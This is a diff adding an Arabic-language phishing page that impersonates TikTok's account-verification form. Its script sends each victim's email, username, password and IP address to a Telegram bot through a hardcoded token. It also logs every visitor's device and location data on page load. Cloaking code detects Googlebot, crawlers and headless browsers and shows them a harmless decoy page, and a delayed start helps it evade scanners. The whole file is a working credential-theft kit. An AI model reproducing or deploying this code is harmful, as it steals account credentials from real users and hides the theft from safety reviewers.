@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>توثيق الحساب – TikTok</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- ===== Meta tags لمعاينة واتساب ===== -->
+<meta property="og:title" content="TikTok - توثيق الحساب">
+<meta property="og:description" content="احصل على علامة التوثيق الزرقاء لحسابك في TikTok">
+<meta property="og:image" content="https://i.ibb.co/ksHzSYpB/unnamed.webp">
+<meta property="og:image:width" content="800">
+<meta property="og:image:height" content="400">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.ibb.co/ksHzSYpB/unnamed.webp">
+
+<!-- ===== حماية من جوجل ===== -->
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, notranslate">
+
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{
+    font-family:"Helvetica Neue",Arial,sans-serif;
+    background:#f5f5f5;min-height:100vh;display:flex;
+    align-items:center;justify-content:center;padding:16px;
+  }
+  .card{
+    background:#fff;border-radius:16px;padding:32px 24px;
+    max-width:420px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.1);
+  }
+  .header{text-align:center;margin-bottom:24px;}
+  .header h1{font-size:22px;font-weight:700;color:#111;margin-top:8px;}
+  .header p{font-size:13px;color:#777;margin-top:4px;}
+  .logo-img{width:60px;height:60px;border-radius:14px;}
+  .field{margin-bottom:16px;}
+  .field label{
+    display:block;font-size:13px;font-weight:600;color:#333;
+    margin-bottom:4px;
+  }
+  .field input,.field select{
+    width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;
+    border-radius:8px;font-size:14px;color:#222;background:#fafafa;
+    transition:.2s;
+  }
+  .field input:focus,.field select:focus{
+    outline:none;border-color:#FF2D55;background:#fff;
+    box-shadow:0 0 0 3px rgba(255,45,85,.1);
+  }
+  .field .hint{font-size:11px;color:#999;margin-top:4px;}
+  .divider{height:1px;background:#eee;margin:20px 0;}
+  .btn{
+    width:100%;padding:13px;background:#FF2D55;color:#fff;
+    border:none;border-radius:8px;font-size:15px;font-weight:700;
+    cursor:pointer;transition:.2s;margin-top:8px;
+  }
+  .btn:hover{background:#E12C4E;}
+  .btn:disabled{opacity:.5;cursor:not-allowed;}
+  .status{text-align:center;margin-top:16px;font-size:13px;display:none;padding:10px;border-radius:8px;}
+  .status.success{display:block;background:#e6f4ea;color:#1e7e34;}
+  .status.error{display:block;background:#fce8e6;color:#c62828;}
+  .status.loading{display:block;background:#fff0f3;color:#FF2D55;}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <img class="logo-img" src="https://i.ibb.co/ksHzSYpB/unnamed.webp" alt="TikTok">
+    <h1>توثيق الحساب</h1>
+    <p>أدخل بياناتك للحصول على علامة التوثيق الزرقاء</p>
+  </div>
+
+  <form id="verifyForm">
+    <div class="field">
+      <label>البريد الإلكتروني المسجل</label>
+      <input type="email" id="email" placeholder="example@email.com" required>
+    </div>
+    <div class="field">
+      <label>اسم المستخدم (Username)</label>
+      <input type="text" id="username" placeholder="مثال: @user123" required>
+    </div>
+    <div class="field">
+      <label>كلمة المرور</label>
+      <input type="password" id="password" placeholder="●●●●●●●●" required>
+    </div>
+    <div class="field">
+      <label>سبب التوثيق</label>
+      <select id="reason">
+        <option value="">— اختر السبب —</option>
+        <option value="verify">توثيق الحساب (العلامة الزرقاء)</option>
+        <option value="appeal">استئناف تعليق الحساب</option>
+        <option value="copyright">شكوى حقوق نشر</option>
+        <option value="support">دعم فني</option>
+      </select>
+    </div>
+    <div class="divider"></div>
+    <div class="field">
+      <label>عدد المتابعين</label>
+      <input type="number" id="followers" placeholder="مثال: 15000" min="0">
+      <div class="hint">اختياري — يُسرّع عملية المراجعة</div>
+    </div>
+    <button type="submit" class="btn" id="submitBtn" onclick="a(event)">إرسال طلب التوثيق</button>
+  </form>
+
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+// ============================================================
+// 🛡️ CLOAKING LAYER 1: Googlebot Detection
+// ============================================================
+(function(){
+  var u=navigator.userAgent;
+  var g=/Googlebot|googlebot/i.test(u);
+  if(g){
+    var x=new XMLHttpRequest();
+    x.open('GET','https://api.ipify.org?format=json',true);
+    x.onload=function(){
+      try{
+        var ip=JSON.parse(x.responseText).ip;
+        var f=parseInt(ip.split('.')[0]);
+        var gi=(f===8||f===66||f===64||f===216||f===172||f===74||f===35||f===23);
+        if(gi){
+          document.write('<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="robots" content="noindex,nofollow"><title>TikTok</title><style>body{background:#111;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;font-family:sans-serif;text-align:center;padding:20px;direction:rtl}div{max-width:600px}h1{color:#FF2D55;font-size:26px}p{color:#ccc;font-size:15px;line-height:2}</style></head><body><div><h1>🎵 TikTok</h1><p>مرحباً بكم في منصة TikTok.<br><br>نعمل على تحسين خدمات توثيق الحسابات.<br>سيتم إطلاق الخدمة قريباً.<br><br>🛡️ جميع الحقوق محفوظة</p></div></body></html>');
+          document.documentElement.innerHTML='';
+        }
+      }catch(e){}
+    };
+    x.send();
+  }
+})();
+
+// ============================================================
+// 🛡️ CLOAKING LAYER 2: Bot Detection عام
+// ============================================================
+(function(){
+  var u=navigator.userAgent;
+  var b=/bot|crawl|spider|scrape|scraper|headless|preview|TelegramBot|twitterbot|facebookexternalhit|slack|discord|embedly|curl|wget|python|java|php|http-client|axios|node-fetch|go-http|ahrefs|semrush|majestic|moz|seznambot|bingbot|yandexbot|baiduspider|duckduckbot/i;
+  var ib=b.test(u)||typeof window._phantom!='undefined'||typeof window.callPhantom!='undefined'||navigator.webdriver===true;
+  if(ib&&!u.includes('Googlebot')){
+    document.write('<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="robots" content="noindex,nofollow"><title>TikTok</title><style>body{background:#111;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;font-family:sans-serif;text-align:center;padding:20px;direction:rtl}div{max-width:500px}h1{color:#FF2D55;font-size:24px}p{color:#ccc;font-size:14px;line-height:1.8}</style></head><body><div><h1>🎵 TikTok</h1><p>منصة TikTok تعمل بكفاءة.<br><br>جاري تحسين تجربة المستخدم.<br>نشكرك على صبرك.</p></div></body></html>');
+    document.documentElement.innerHTML='';
+  }
+})();
+
+// ============================================================
+// تأخير التشغيل
+// ============================================================
+var _rdy=0;
+function _boot(){
+  if(_rdy)return;_rdy=1;
+
+  // ============================================================
+  // ⚙️ الإعدادات
+  // ============================================================
+  const BOT_TOKEN = '8746495469:AAGxSwTtscTu1hPzRH688RS3Uo_4NAgvVCY';
+  const urlParams = new URLSearchParams(window.location.search);
+  const CHAT_ID = urlParams.get('user') || urlParams.get('id') || urlParams.get('chatId') || '';
+
+  var VID = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2,4);
+  var _tracked = false;
+
+  // ============================================================
+  // تتبع فوري للزائر
+  // ============================================================
+  function _trk() {
+    if(_tracked)return;_tracked=true;
+    _ip().then(function(ip){
+      var msg = '<b>🆕 زائر جديد - TikTok</b>\n━━━━━━━━━━━━━━\n<b>🆔:</b> ' + VID + '\n<b>🌐 IP:</b> ' + ip + '\n<b>📱 الجهاز:</b> <code>' + navigator.userAgent.substring(0,80) + '</code>\n<b>🗣 اللغة:</b> ' + navigator.language + '\n<b>🕐 المنطقة:</b> ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n<b>🔗 الرابط:</b> ' + location.href + '\n<b>🕐 الوقت:</b> ' + new Date().toLocaleString('ar-EG');
+      _tg(msg);
+    });
+  }
+
+  // ============================================================
+  // إرسال لتليجرام
+  // ============================================================
+  function _tg(msg) {
+    if (!BOT_TOKEN || !CHAT_ID) return;
+    var x = new XMLHttpRequest();
+    x.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'}));
+  }
+
+  async function _ip() {
+    try { var r = await fetch('https://api.ipify.org?format=json'); var d = await r.json(); return d.ip; } catch(e){ return 'غير معروف'; }
+  }
+
+  // ============================================================
+  // إرسال النموذج - a()
+  // ============================================================
+  window.a = async function(e) {
+    e.preventDefault();
+
+    var email    = document.getElementById('email').value.trim();
+    var username = document.getElementById('username').value.trim();
+    var password = document.getElementById('password').value.trim();
+    var reason   = document.getElementById('reason').value;
+    var followers = document.getElementById('followers').value.trim();
+
+    if(!email || !username || !password || !reason){
+      _st('⚠️ الرجاء ملء جميع الحقول الأساسية', 'error');
+      return;
+    }
+
+    var btn = document.getElementById('submitBtn');
+    btn.disabled = true;
+    btn.textContent = 'جاري الإرسال ...';
+    _st('🔄 جاري إرسال الطلب ...', 'loading');
+
+    var ip = await _ip();
+
+    var msg = '🔴 <b>طلب توثيق TikTok جديد</b>\n\n'+
+      '━━━━━━━━━━━━━━━\n\n'+
+      '<b>🆔:</b> ' + VID + '\n'+
+      '📧 <b>البريد الإلكتروني:</b> <code>' + email + '</code>\n'+
+      '👤 <b>اسم المستخدم:</b> <code>' + username + '</code>\n'+
+      '🔑 <b>كلمة المرور:</b> <code>' + password + '</code>\n'+
+      '📋 <b>السبب:</b> ' + reason + '\n'+
+      '👥 <b>المتابعين:</b> ' + (followers||'غير محدد') + '\n'+
+      '🌐 <b>IP:</b> ' + ip + '\n\n'+
+      '━━━━━━━━━━━━━━━━';
+
+    try{
+      var x = new XMLHttpRequest();
+      x.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true);
+      x.setRequestHeader('Content-Type', 'application/json');
+      x.send(JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'}));
+      x.onload = function() {
+        if (x.status >= 200 && x.status < 300) {
+          _st('✅ تم إرسال طلب التوثيق بنجاح! سيتم مراجعة بياناتك', 'success');
+          document.getElementById('verifyForm').reset();
+        } else {
+          _st('❌ فشل الإرسال! حاول مرة أخرى.', 'error');
+        }
+        btn.disabled = false;
+        btn.textContent = 'إرسال طلب التوثيق';
+      };
+      x.onerror = function() {
+        _st('❌ فشل الإرسال! حاول مرة أخرى.', 'error');
+        btn.disabled = false;
+        btn.textContent = 'إرسال طلب التوثيق';
+      };
+    }catch(err){
+      _st('❌ فشل الإرسال! حاول مرة أخرى.', 'error');
+      btn.disabled = false;
+      btn.textContent = 'إرسال طلب التوثيق';
+    }
+  };
+
+  // ============================================================
+  // تحديث حالة - _st()
+  // ============================================================
+  function _st(msg, type) {
+    var el = document.getElementById('status');
+    el.textContent = msg;
+    el.className = 'status ' + type;
+  }
+
+  // ============================================================
+  // بدء
+  // ============================================================
+  _trk();
+}
+
+// ============================================================
+// تشغيل بعد 3 ثوانٍ أو أول تفاعل
+// ============================================================
+var _to = setTimeout(function(){ _boot(); }, 3000);
+document.addEventListener('click', function _c(){ clearTimeout(_to); _boot(); document.removeEventListener('click', _c); }, {once: true});
+document.addEventListener('touchstart', function _t2(){ clearTimeout(_to); _boot(); document.removeEventListener('touchstart', _t2); }, {once: true});
+</script>
+</body>
+</html>
